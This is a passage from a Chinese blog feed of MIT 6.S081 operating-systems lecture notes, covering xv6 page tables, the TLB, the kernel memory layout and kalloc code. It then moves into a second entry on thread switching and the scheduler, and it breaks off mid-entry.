directory。</p><p>学生提问：当一个进程请求一个虚拟内存地址时，CPU会查看SATP寄存器得到对应的最高一级pagetable，这级page table会使用虚拟内存地址中27bitindex的最高9bit来完成索引，如果索引的结果为空，MMU会自动创建一个pagetable吗？</p><p>Frans教授：不会的，MMU会告诉操作系统或者处理器，抱歉我不能翻译这个地址，最终这会变成一个pagefault。如果一个地址不能被翻译，那就不翻译。就像你在运算时除以0一样，处理器会拒绝那样做。</p><p>学生提问：我想知道我们是怎么计算pagetable的物理地址，是不是这样，我们从最高级的pagetable得到44bit的PPN，然后再加上虚拟地址中的12bitoffset，就得到了完整的56bit page table物理地址？</p><p>Frans教授：我们不会加上虚拟地址中的offset，这里只是使用了12bit的0。所以我们用44bit的PPN，再加上12bit的0，这样就得到了下一级pagedirectory的56bit物理地址。这里要求每个pagedirectory都与物理page对齐（也就是pagedirectory的起始地址就是某个page的起始地址，所以低12bit都为0）。</p></blockquote><h3 id="页表缓存">页表缓存</h3><p>如果我们回想一下pagetable的结构，你可以发现，当处理器从内存加载或者存储数据时，基本上都要做3次内存查找，第一次在最高级的pagedirectory，第二次在中间级的page directory，最后一次在最低级的pagedirectory。所以对于一个虚拟内存地址的寻址，需要读三次内存，这里代价有点高。所以实际中，几乎所有的处理器都会对于最近使用过的虚拟地址的翻译结果有缓存。这个缓存被称为：<strong>TranslationLooksideBuffer（通常翻译成页表缓存）</strong>。你会经常看到它的缩写TLB。基本上来说，这就是PageTable Entry的缓存，也就是PTE的缓存。</p><p>如果我们回想一下pagetable的结构，你可以发现，当处理器从内存加载或者存储数据时，基本上都要做3次内存查找，第一次在最高级的pagedirectory，第二次在中间级的page directory，最后一次在最低级的pagedirectory。所以对于一个虚拟内存地址的寻址，需要读三次内存，这里代价有点高。所以实际中，几乎所有的处理器都会对于最近使用过的虚拟地址的翻译结果有缓存。这个缓存被称为：TranslationLooksideBuffer（通常翻译成页表缓存）。你会经常看到它的缩写TLB。基本上来说，这就是PageTable Entry的缓存，也就是PTE的缓存。</p><blockquote><p>学生提问：前面说TLB会保存虚拟地址到物理地址的对应关系，如果在page级别做cache是不是更加高效？</p><p>Frans教授：有很多种方法都可以实现TLB，对于你们来说最重要的是知道TLB是存在的。TLB实现的具体细节不是我们要深入讨论的内容。这是处理器中的一些逻辑，对于操作系统来说是不可见的，操作系统也不需要知道TLB是如何工作的。你们需要知道TLB存在的唯一原因是，如果你切换了pagetable，操作系统需要告诉处理器当前正在切换pagetable，处理器会清空TLB。因为本质上来说，如果你切换了pagetable，TLB中的缓存将不再有用，它们需要被清空，否则地址翻译可能会出错。所以操作系统知道TLB是存在的，但只会时不时的告诉操作系统，现在的TLB不能用了，因为要切换pagetable了。在RISC-V中，清空TLB的指令是sfence_vma。</p><p>学生提问：3级的page table是由操作系统实现的还是由硬件自己实现的？</p><p>Frans教授：这是由硬件实现的，所以3级 pagetable的查找都发生在硬件中。MMU是硬件的一部分而不是操作系统的一部分。在XV6中，有一个函数也实现了pagetable的查找，因为时不时的XV6也需要完成硬件的工作，所以XV6有这个叫做walk的函数，它在软件中实现了MMU硬件相同的功能。</p><p>学生提问：在这个机制中，TLB发生在哪一步，是在地址翻译之前还是之后？</p><p>Frans教授：整个CPU和MMU都在处理器芯片中，所以在一个RISC-V芯片中，有多个CPU核，MMU和TLB存在于每一个CPU核里面。RISC-V处理器有L1cache，L2Cache，有些cache是根据物理地址索引的，有些cache是根据虚拟地址索引的，由虚拟地址索引的cache位于MMU之前，由物理地址索引的cache位于MMU之后。</p><p>学生提问：之前提到，硬件会完成3级 pagetable的查找，那为什么我们要在XV6中有一个walk函数来完成同样的工作？</p><p>Frans教授：非常好的问题。这里有几个原因，首先XV6中的walk函数设置了最初的pagetable，它需要对3级page table进行编程所以它首先需要能模拟3级pagetable。另一个原因或许你们已经在syscall实验中遇到了，在XV6中，内核有它自己的pagetable，用户进程也有自己的pagetable，用户进程指向sys_info结构体的指针存在于用户空间的pagetable，但是内核需要将这个指针翻译成一个自己可以读写的物理地址。如果你查看copy_in，copy_out，你可以发现内核会通过用户进程的pagetable，将用户的虚拟地址翻译得到物理地址，这样内核可以读写相应的物理内存地址。这就是为什么在XV6中需要有walk函数的一些原因。</p><p>学生提问：为什么硬件不开发类似于walk函数的接口？这样我们就不用在XV6中用软件实现自己的接口，自己实现还容易有bug。为什么没有一个特殊权限指令，接收虚拟内存地址，并返回物理内存地址？</p><p>Frans教授：其实这就跟你向一个虚拟内存地址写数据，硬件会自动帮你完成工作一样（工作是指翻译成物理地址，并完成数据写入）。你们在pagetable实验中会完成相同的工作。我们接下来在看XV6的实现的时候会看到更多的内容。</p></blockquote><h3 id="xv6中的虚拟空间">xv6中的虚拟空间</h3><p>首先我们来看一下kernelpage的分布。下图就是内核中地址的对应关系，左边是内核的虚拟地址空间，右边上半部分是物理内存或者说是DRAM，右边下半部分是I/O设备。接下来我会首先介绍右半部分，然后再介绍左半部分。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=MmRmNDE3N2JiOWM2MDdlZDJmZjY3MDQ0ZDJjMDFhNDhfQm1rSnd0dFA2NU51MWYxaVdjV2ZKdUlKVzFFWGlZS2lfVG9rZW46S3hQTmJpeFZNb3pjRUR4RldxM2NGQzlNbndnXzE2OTY1NzQ5MjA6MTY5NjU3ODUyMF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>图中的右半部分的结构完全由硬件设计者决定。如你们上节课看到的一样，当操作系统启动时，<strong>会从地址0x80000000开始运行</strong>，这个地址其实也是由硬件设计者决定的。</p><p>我们现在知道了qemu模拟处理器中<strong>有4个核，每个核都有自己的MMU和TLB</strong>。处理器旁边就是DRAM芯片。</p><p>主板的设计人员决定了，在完成了虚拟地址到物理地址的翻译之后，如果得到的物理地址大于0x80000000会走向DRAM芯片，<strong>如果得到的物理地址低于0x80000000会走向不同的I/O设备。</strong>这是由这个主板的设计人员决定的物理结构。如果你想要查看这里的物理结构，你可以阅读主板的手册，手册中会一一介绍物理地址对应关系。</p><p>首先，地址0是保留的，<strong>地址0x10090000对应以太网</strong>，<strong>地址0x80000000对应DDR内存，处理器外的易失存储（Off-ChipVolatile Memory），也就是主板上的DRAM芯片（就是内存）。</strong></p><p>回到最初那张图的右侧：物理地址的分布。可以看到最下面是未被使用的地址，这与主板文档内容是一致的（地址为0）。<strong>地址0x1000是bootROM的物理地址，当你对主板上电，主板做的第一件事情就是运行存储在bootROM中的代码，当boot完成之后，会跳转到地址0x80000000，操作系统需要确保那个地址有一些数据能够接着启动操作系统。</strong></p><p>这里还有一些其他的I/O设备：</p><ul><li>PLIC是中断控制器（Platform-Level Interrupt Controller）</li><li>CLINT（Core LocalInterruptor）也是中断的一部分。所以多个设备都能产生中断，需要中断控制器来将这些中断路由到合适的处理函数。</li><li>UART0（Universal AsynchronousReceiver/Transmitter）负责与Console和显示器交互。</li><li>VIRTIO disk，与磁盘进行交互。</li></ul><p><strong>地址0x02000000对应CLINT，当你向这个地址执行读写指令，你是向实现了CLINT的芯片执行读写。这里你可以认为你直接在与设备交互，而不是读写物理内存</strong>。</p><blockquote><p>学生提问：确认一下，低于0x80000000的物理地址，不存在于DRAM中，当我们在使用这些地址的时候，指令会直接走向其他的硬件，对吗？</p><p>Frans教授：是的。高于0x80000000的物理地址对应DRAM芯片，但是对于例如以太网接口，也有一个特定的低于0x80000000的物理地址，我们可以对这个叫做内存映射I/O（Memory-mappedI/O）的地址执行读写指令，来完成设备的操作。</p><p>学生提问：为什么物理地址最上面一大块标为未被使用？</p><p>Frans教授：物理地址总共有2^56那么多，但是你不用在主板上接入那么多的内存。所以不论主板上有多少DRAM芯片，总是会有一部分物理地址没有被用到。实际上在XV6中，我们限制了内存的大小是128MB。</p><p>学生提问：当读指令从CPU发出后，它是怎么路由到正确的I/O设备的？比如说，当CPU要发出指令时，它可以发现现在地址是低于0x80000000，但是它怎么将指令送到正确的I/O设备？</p><p>Frans教授：你可以认为在RISC-V中有一个多路输出选择器（demultiplexer）。</p></blockquote><blockquote><p><strong>学生提问：对于不同的进程会有不同的kernelstack吗？</strong></p><p>Frans：答案是的。每一个用户进程都有一个对应的kernel stack</p><p>学生提问：用户程序的虚拟内存会映射到未使用的物理地址空间吗？</p><p>Frans教授：在kernel page table中，有一段FreeMemory，它对应了物理内存中的一段地址。</p></blockquote><p>当机器刚刚启动时，还没有可用的page，XV6操作系统会设置好内核使用的虚拟地址空间，也就是这张图左边的地址分布。</p><p>因为我们想让XV6尽可能的简单易懂，所以这里的虚拟地址到物理地址的映射，大部分是相等的关系。比如说内核会按照这种方式设置pagetable，虚拟地址0x02000000对应物理地址0x02000000。这意味着左侧低于PHYSTOP的虚拟地址，与右侧使用的物理地址是一样的</p><p>所以，这里的箭头都是水平的，因为这里是完全相等的映射。</p><p>除此之外，这里还有两件重要的事情：</p><p>第一件事情是，有一些page在虚拟内存中的地址很靠后，比如kernelstack在虚拟内存中的地址就很靠后。这是因为在它之下有一个未被映射的Guardpage，这个Guard page对应的PTE的Valid标志位没有设置，<strong>这样，如果kernel stack耗尽了，它会溢出到Guardpage，但是因为Guard page的PTE中Valid标志位未设置，会导致立即触发pagefault</strong>，这样的结果好过内存越界之后造成的数据混乱。立即触发一个panic（也就是pagefault），你就知道kernel stack出错了。同时我们也又不想浪费物理内存给Guardpage，所以Guardpage不会映射到任何物理内存，它只是占据了虚拟地址空间的一段靠后的地址。</p><p>同时，kernelstack被映射了两次，在靠后的虚拟地址映射了一次，在PHYSTOP下的Kerneldata中又映射了一次，但是实际使用的时候用的是上面的部分，因为有Guardpage会更加安全。</p><p>这是众多你可以通过pagetable实现的有意思的事情之一。你可以向同一个物理地址映射两个虚拟地址，你可以不将一个虚拟地址映射到物理地址。可以是一对一的映射，一对多映射，多对一映射。XV6至少在1-2个地方用到类似的技巧。这的kernelstack和Guard page就是XV6基于page table使用的有趣技巧的一个例子。</p><p><strong>第二件事情是权限。例如Kernel textpage被标位R-X，意味着你可以读它，也可以在这个地址段执行指令，但是你不能向Kerneltext写数据。通过设置权限我们可以尽早的发现Bug从而避免Bug。对于Kerneldata需要能被写入，所以它的标志位是RW-，但是你不能在这个地址段运行指令，所以它的X标志位未被设置。</strong>（注，所以，kerneltext用来存代码，代码可以读，可以运行，但是不能篡改，kerneldata用来存数据，数据可以读写，但是不能通过数据伪装代码在kernel中运行）</p><blockquote><p>XV6使用这段free memory来存放用户进程的pagetable，text和data。如果我们运行了非常多的用户进程，某个时间点我们会耗尽这段内存，这个时候fork或者exec会返回错误。</p><p>同一个学生提问：这就意味着，用户进程的虚拟地址空间会比内核的虚拟地址空间小的多，是吗？</p><p>Frans教授：<strong>本质上来说，两边的虚拟地址空间大小是一样的。但是用户进程的虚拟地址空间使用率会更低。</strong></p><p>学生提问：如果多个进程都将内存映射到了同一个物理位置，这里会优化合并到同一个地址吗？（懒分配和cow）</p><p>Frans教授：XV6不会做这样的事情，但是pagetable实验中有一部分就是做这个事情。真正的操作系统会做这样的工作。当你们完成了pagetable实验，你们就会对这些内容更加了解。</p></blockquote><p>开机后 =&gt; main =&gt; kvminit(设置kernel以及以及硬件的地址)，</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=NDI1YzE3MDVkNDNhYjIyOThhYjk4ZjM4N2EwYjIwNzBfdGdwdGhwRXltVThYNW5iaGM2MFhEM1FWWDhkakh1T3pfVG9rZW46Q3RDRWI3VDUwb3ZIS3l4djJ2N2NCU3BHbjJtXzE2OTY1NzQ5MjA6MTY5NjU3ODUyMF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>我们来看一下这里的输出。第一行是最高一级pagedirectory的地址，这就是存在SATP或者将会存在SATP中的地址。第二行可以看到最高一级pagedirectory只有一条PTE序号为0，它包含了中间级pagedirectory的物理地址。第三行可以看到中间级的pagedirectory只有一条PTE序号为128，它指向了最低级pagedirectory的物理地址。第四行可以看到最低级的pagedirectory包含了PTE指向物理地址。你们可以看到最低一级 pagedirectory中PTE的物理地址就是0x10000000，对应了UART0。</p><p>前面是物理地址，我们可以从虚拟地址的角度来验证这里符合预期。我们将地址0x10000000向右移位12bit，这样可以得到虚拟地址的高27bit（index部分）。之后我们再对这部分右移位9bit，并打印成10进制数，可以得到128，这就是中间级pagedirectory中PTE的序号。这与之前（4.4）介绍的内容是符合的。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=NDdmZmFkM2IwMjQ5Nzc2MmFiMzQyODYxMWJkYzA4MDhfQXl0U3ZQSFhjTWJsTDJnNU4xbEd4clpGUVo2N2tVZDVfVG9rZW46UHNJcmJTcXZTb3JlaUl4YUF4WmNjZFBZbjNiXzE2OTY1NzQ5MjA6MTY5NjU3ODUyMF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>之后，kvminit函数返回了，在main函数中，我们运行到了kvminithart函数。</p><p>这个函数首先设置了SATP寄存器，kernel_pagetable变量来自于kvminit第一行。所以这里实际上是内核告诉MMU来使用刚刚设置好的pagetable。当这里这条指令执行之后，下一个指令的地址会发生什么？</p><p>在这条指令之前，还不存在可用的pagetable，所以也就不存在地址翻译。执行完这条指令之后，程序计数器（ProgramCounter）增加了4。而之后的下一条指令被执行时，程序计数器会被内存中的pagetable翻译。</p><p>所以这条指令的执行时刻是一个非常重要的时刻。因为整个地址翻译从这条指令之后开始生效，之后的每一个使用的内存地址都可能对应到与之不同的物理内存地址。因为在这条指令之前，我们使用的都是物理内存地址，这条指令之后pagetable开始生效，所有的内存地址都变成了另一个含义，也就是虚拟内存地址。</p><p>这里能正常工作的原因是值得注意的。因为前一条指令还是在物理内存中，而后一条指令已经在虚拟内存中了。比如，下一条指令地址是0x80001110就是一个虚拟内存地址。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=NTUzZDVhZDBjMTlhOTVlYmExNTY4MzE1ZGQzOTYwNGZfVmxIbTE2Vlk4NVRoQUJwckZmNEJhNzVuV2ltRTZGb1pfVG9rZW46Tmd2R2J1TWZPb0lhbHV4SnNub2NEQjI3bnVnXzE2OTY1NzQ5MjA6MTY5NjU3ODUyMF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>为什么这里能正常工作呢？因为kernelpage的映射关系中，虚拟地址到物理地址是完全相等的。所以，在我们打开虚拟地址翻译硬件之后，地址翻译硬件会将一个虚拟地址翻译到相同的物理地址。所以实际上，我们最终还是能通过内存地址执行到正确的指令，因为经过地址翻译0x80001110还是对应0x80001110。</p><p>管理虚拟内存的一个难点是，一旦执行了类似于SATP这样的指令，你相当于将一个pagetable加载到了SATP寄存器，你的世界完全改变了。现在每一个地址都会被你设置好的pagetable所翻译。那么假设你的pagetable设置错误了，会发生什么呢？有人想回答这个问题吗？</p><p>是的，因为pagetable没有设置好，虚拟地址可能根本就翻译不了，那么内核会停止运行并panic。所以，如果pagetable中有bug，你将会看到奇怪的错误和崩溃，这导致了pagetable实验将会比较难。如果你不够小心，或者你没有完全理解一些细节，你可能会导致kernel崩溃，这将会花费一些时间和精力来追踪背后的原因。</p><h3 id="代码演示">代码演示</h3><p>内存分配的代码主要在kernel/kalloc.c里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// 初始化内核的时候调用</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KERNBASE 0x80000000L</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PHYSTOP (KERNBASE + 128*1024*1024)</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> end[]; / first address after kernel. defined by kernel.ld.<br><br><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">kinit</span><span class="hljs-params">()</span><br>&#123;<br>  initlock(&amp;kmem.lock, <span class="hljs-string">&quot;kmem&quot;</span>);<br>  freerange(end, (<span class="hljs-type">void</span>*)PHYSTOP); <span class="hljs-comment">// end = ，PHYSTOP =  </span><br>&#125;<br><br><span class="hljs-comment">// 以PAGE_SZIE为单位释放某段物理内存</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">freerange</span><span class="hljs-params">(<span class="hljs-type">void</span> *pa_start, <span class="hljs-type">void</span> *pa_end)</span><br>&#123;<br>  <span class="hljs-type">char</span> *p; <br>  p = (<span class="hljs-type">char</span>*)PGROUNDUP((uint64)pa_start);<br>  <span class="hljs-keyword">for</span>(; p + PGSIZE &lt;= (<span class="hljs-type">char</span>*)pa_end; p += PGSIZE)<br>    kfree(p);<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">void</span> *pa)</span><br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">r</span>;</span> <br><br>  <span class="hljs-keyword">if</span>(((uint64)pa % PGSIZE) != <span class="hljs-number">0</span> || (<span class="hljs-type">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)<br>    panic(<span class="hljs-string">&quot;kfree&quot;</span>);<br><br>  <span class="hljs-comment">// Fill with junk to catch dangling refs.</span><br>  <span class="hljs-built_in">memset</span>(pa, <span class="hljs-number">1</span>, PGSIZE);<br><br>  r = (<span class="hljs-keyword">struct</span> run*)pa;<br><br>  acquire(&amp;kmem.lock);<br>  r-&gt;next = kmem.freelist;<br>  kmem.freelist = r;<br>  release(&amp;kmem.lock);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，计算机基础, C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thread Switch</title>
    <link href="/emocoder/2023/10/05/oslearning/mit-6.s081/thread/thread/"/>
    <url>/emocoder/2023/10/05/oslearning/mit-6.s081/thread/thread/</url>
    
    <content type="html"><![CDATA[<h3 id="线程切换的重点">线程切换的重点</h3><ol type="1"><li><strong>如何实现线程间的切换</strong>？这里停止一个线程的运行并启动另一个线程的过程通常被称为线程调度（Scheduling）。我们将会看到XV6为每个CPU核都创建了一个线程调度器（Scheduler）。</li><li><strong>如何保存线程状态</strong>？当你想要实际实现从一个线程切换到另一个线程时，你需要保存并恢复线程的状态，所以需要决定线程的哪些信息是必须保存的，并且在哪保存它们。</li><li><strong>如何处理运算密集型线程</strong>（compute boundthread）？对于线程切换，很多直观的实现是由线程自己自愿的保存自己的状态，再让其他的线程运行。但是如果我们有一些程序正在执行一些可能要花费数小时的长时间计算任务，这样的线程并不能自愿的出让CPU给其他的线程运行。所以这里需要能从长时间运行的运算密集型线程撤回对于CPU的控制，将其放置于一边，稍后再运行它。</li></ol><p>接下来，我将首先介绍<strong>如何处理运算密集型线程</strong>。这里的具体实现你们之前或许已经知道了，<strong>就是利用定时器中断</strong>。<strong>在每个CPU核上，都存在一个硬件设备，它会定时产生中断</strong>。XV6与其他所有的操作系统一样，将这个中断传输到了内核中。所以即使我们正在用户空间计算π的前100万位，定时器中断仍然能在例如每隔10ms的某个时间触发，并将程序运行的控制权从用户空间代码切换到内核中的中断处理程序（注：因为中断处理程序优先级更高）。哪怕这些用户空间进程并不配合工作（注，也就是用户空间进程一直占用CPU），内核也可以从用户空间进程获取CPU控制权。</p><p>位于内核的<strong>定时器中断处理程序</strong>，会自愿的将CPU让出（yield）给线程调度器，并告诉线程调度器说，你可以让一些其他的线程运行了。这里的出让其实也是一种线程切换，它会保存当前线程的状态，并在稍后恢复。</p><p>在之前的课程中，你们已经了解过了中断处理的流程。<strong>这里的基本流程是，定时器中断将CPU控制权给到内核，内核再自愿的出让CPU。</strong></p><p>这样的处理流程被称为pre-emptivescheduling。pre-emptive的意思是，即使用户代码本身没有出让CPU，定时器中断仍然会将CPU的控制权拿走，并出让给线程调度器。与之相反的是voluntaryscheduling</p><p>voluntary scheduling：用户进程自愿让出cpu控制权</p><p>pre-emptive scheduling：定时器强制剥夺cpu控制权</p><p>有趣的是，在XV6和其他的操作系统中，线程调度是这么实现的：定时器中断会强制的将CPU控制权从用户进程给到内核，这里是pre-emptivescheduling，之后内核会代表用户进程（注，实际是内核中用户进程对应的内核线程会代表用户进程出让CPU），使用voluntaryscheduling。</p><p>在执行线程调度的时候，操作系统需要能区分几类线程：</p><ul><li>当前在CPU上运行的线程，对应RUNNING</li><li>一旦CPU有空闲时间就想要运行在CPU上的线程，对应RUNABLE</li><li>以及不想运行在CPU上的线程，因为这些线程可能在等待I/O或者其他事件，对应SLEEPING</li></ul><p>这里不同的线程是由状态区分，但是实际上线程的完整状态会要复杂的多（注，线程的完整状态包含了程序计数器，寄存器，栈等等）。</p><p>下面是我们将会看到的一些简单的线程状态：</p><p>RUNNING，线程当前正在某个CPU上运行</p><p>RUNABLE，线程还没有在某个CPU上运行，但是一旦有空闲的CPU就可以运行</p><p>SLEEPING，这节课我们不会介绍，下节课会重点介绍，这个状态意味着线程在等待一些I/O事件，它只会在I/O事件发生了之后运行</p><p>今天这节课，我们主要关注RUNNING和RUNABLE这两类线程。前面介绍的定时器中断或者说pre-emptivescheduling，实际上就是将一个RUNNING线程转换成一个RUNABLE线程。通过出让CPU，pre-emptivescheduling将一个正在运行的线程转换成了一个当前不在运行但随时可以再运行的线程。因为当定时器中断触发时，这个线程还在好好的运行着。</p><p>对于RUNNING状态下的线程，它的程序计数器和寄存器位于正在运行它的CPU硬件中。而RUNABLE线程，因为并没有CPU与之关联，所以对于每一个RUNABLE线程，当我们将它从RUNNING转变成RUNABLE时，我们需要将它还在RUNNING时位于CPU的状态拷贝到内存中的某个位置，注意这里不是从内存中的某处进行拷贝，而是从CPU中的寄存器拷贝。我们需要拷贝的信息就是程序计数器（ProgramCounter）和寄存器。</p><p>当线程调度器决定要运行一个RUNABLE线程时，这里涉及了很多步骤，但是其中一步是将之前保存的程序计数器和寄存器拷贝回调度器对应的CPU中。</p><h3 id="线程切换">线程切换</h3><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=YWUwM2Q0OTI3NDgzNmY4OWJjYjk2NjZmOTgxYjg2MTVfUWJSbVU1Mm81VW9wZW1Cak5CbWJyQmhqbU9KVElZcmVfVG9rZW46TXBuWmJFQmJnbzBVc0J4eUNRN2M5VmxZbkpmXzE2OTY1NzQyMjc6MTY5NjU3NzgyN19WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>我们或许会运行多个用户空间进程，例如Ccompiler（CC），LS，Shell，它们或许会，也或许不会想要同时运行。在用户空间，<strong>每个进程有自己的内存，每个进程都包含了一个用户程序栈</strong>（userstack），并且当进程运行的时候，它会有属于自己的程序计数器和寄存器（表面上持有，但不是真正属于它，参考虚拟内存）。当用户程序在运行时，实际上是用户进程中的一个用户线程在运行（<strong>注：这里指xv6，xv6进程有且只有一个线程</strong>）。下面回顾系统调用章节：如果程序执行了一个系统调用或者因为响应中断走到了内核中，那么相应的用户空间状态会被保存在程序的trapframe中（<strong>注，详见lec06trap</strong>），同时属于这个用户程序的内核线程被激活。所以首先，用户的程序计数器，寄存器等等被保存到了trapframe中，之后CPU被切换到内核栈上运行，实际上会走到trampoline和usertrap代码中（注，详见lec06）。之后内核会运行一段时间处理系统调用或者执行中断处理程序。在处理完成之后，如果需要返回到用户空间，trapframe中保存的用户进程状态会被恢复。</p><p>除了系统调用，用户进程也有可能是因为CPU需要响应类似于定时器中断走到了内核空间。上一节提到的pre-emptivescheduling，会通过定时器中断将CPU运行切换到另一个用户进程。在定时器中断程序中，如果XV6内核决定<strong>从一个用户进程切换到另一个用户进程</strong>，那么首先在内核中第一个进程的内核线程会被切换到第二个进程的内核线程。之后再在第二个进程的内核线程中返回到用户空间的第二个进程，这里返回也是通过恢复trapframe中保存的用户进程状态完成。</p><p>当XV6从某个程序（cc命令：c compilercommand）的内核线程切换到另一个程序（ls命令）的内核线程时：</p><ol type="1"><li>XV6会首先会将CC程序的内核线程的内核寄存器保存在一个context对象中。</li><li>类似的，因为要切换到LS程序的内核线程，那么LS程序现在的状态必然是RUNABLE，表明LS程序之前运行了一半。这同时也意味着LS程序的用户空间状态已经保存在了对应的trapframe中，更重要的是，LS程序的内核线程对应的内核寄存器也已经保存在对应的context对象中。所以接下来，XV6会恢复LS程序的内核线程的context对象，也就是恢复内核线程的寄存器。</li><li>之后LS会继续在它的内核线程栈上，完成它的中断处理程序（注，假设之前LS程序也是通过定时器中断触发的pre-emptivescheduling进入的内核）。</li><li>然后通过恢复LS程序的trapframe中的用户进程状态，返回到用户空间的LS程序中。</li><li>最后恢复执行LS。</li></ol><p><strong>这里核心点在于，在XV6中，任何时候都需要经历：</strong></p><ol type="1"><li>从一个用户进程切换到另一个用户进程，都需要从第一个用户进程接入到内核中，保存用户进程的状态并运行第一个用户进程的内核线程。</li><li>再从第一个用户进程的内核线程切换到第二个用户进程的内核线程。</li><li>之后，第二个用户进程的内核线程暂停自己，并恢复第二个用户进程的用户寄存器。</li><li>最后返回到第二个用户进程继续执行。</li></ol><p>此处应该有图</p><p>我们从一个正在运行的用户空间进程切换到另一个RUNABLE但是还没有运行的用户空间进程的更完整的故事是：</p><ol type="1"><li>首先与我之前介绍的一样，一个定时器中断强迫CPU从用户空间进程切换到内核，trampoline代码将用户寄存器保存于用户进程对应的trapframe对象中；</li><li>之后在内核中运行usertrap，来实际执行相应的中断处理程序。这时，CPU正在进程P1的内核线程和内核栈上，执行内核中普通的C代码；</li><li>假设进程P1对应的内核线程决定它想出让CPU，它会做很多工作，这个我们稍后会看，但是最后它会调用swtch函数（译注：switch是C 语言关键字，因此这个函数命名为swtch来避免冲突），这是整个线程切换的核心函数之一；</li><li>swtch函数会保存用户进程P1对应内核线程的寄存器至context对象。所以目前为止有两类寄存器：用户寄存器存在trapframe中，内核线程的寄存器存在context中。</li></ol><p>此处应该有图</p><p>但是，实际上swtch函数并不是直接从一个内核线程切换到另一个内核线程。<strong>XV6中，一个CPU上运行的内核线程可以直接切换到的是这个CPU对应的调度器线程，但是用户进程之间是无法直接切换的。</strong>所以如果我们运行在CPU0，swtch函数会恢复之前为CPU0的调度器线程保存的寄存器和stackpointer，之后就在调度器线程的context下执行schedulder函数中（注，后面代码分析有介绍）。</p><p>在schedulder函数中会做一些清理工作，例如将进程P1设置成RUNABLE状态。之后再通过进程表单找到下一个RUNABLE进程。<strong>假设找到的下一个进程是P2（虽然也有可能找到的还是P1）</strong>，schedulder函数会再次调用swtch函数，完成下面步骤：</p><ol type="1"><li>先保存自己的寄存器到调度器线程的context对象</li><li>找到进程P2之前保存的context，恢复其中的寄存器</li><li>因为进程P2在进入RUNABLE状态之前，如刚刚介绍的进程P1一样，必然也调用了swtch函数。所以之前的swtch函数会被恢复，并返回到进程P2所在的系统调用或者中断处理程序中（注，因为P2进程之前调用swtch函数必然在系统调用或者中断处理程序中）。</li><li>不论是系统调用也好中断处理程序也好，在从用户空间进入到内核空间时会保存用户寄存器到trapframe对象。所以当内核程序执行完成之后，trapframe中的用户寄存器会被恢复。</li><li>最后用户进程P2就恢复运行了。</li></ol><p><strong>每一个CPU都有一个完全不同的调度器线程。</strong>调度器线程也是一种内核线程，它也有自己的context对象。任何运行在CPU上的进程，当它决定出让CPU，它都会切换到CPU对应的调度器线程，并由调度器线程切换到下一个进程。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs TypeScript">context保存在哪？<br>每一个内核线程都有一个context对象。但是内核线程实际上有两类。每一个用户进程有一个对应的内核线程，它的context对象保存在用户进程对应的proc结构体中。<br>每一个调度器线程，它也有自己的context对象，但是它却没有对应的进程和proc结构体，所以调度器线程的context对象保存在cpu结构体中。在内核中，有一个cpu结构体的数组，每个cpu结构体对应一个<span class="hljs-variable constant_">CPU</span>核，每个结构体中都有一个context字段。<br><br>为什么不能将context对象保存在进程对应的trapframe中？<br>context可以保存在trapframe中，因为每一个进程都只有一个内核线程对应的一组寄存器，我们可以将这些寄存器保存在任何一个与进程一一对应的数据结构中。对于每个进程来说，有一个proc结构体，有一个trapframe结构体，所以我们可以将context保存于trapframe中。但是或许出于简化代码或者让代码更清晰的目的，trapframe还是只包含进入和离开内核时的数据。而context结构体中包含的是在内核线程和调度器线程之间切换时，需要保存和恢复的数据。<br><br>让出<span 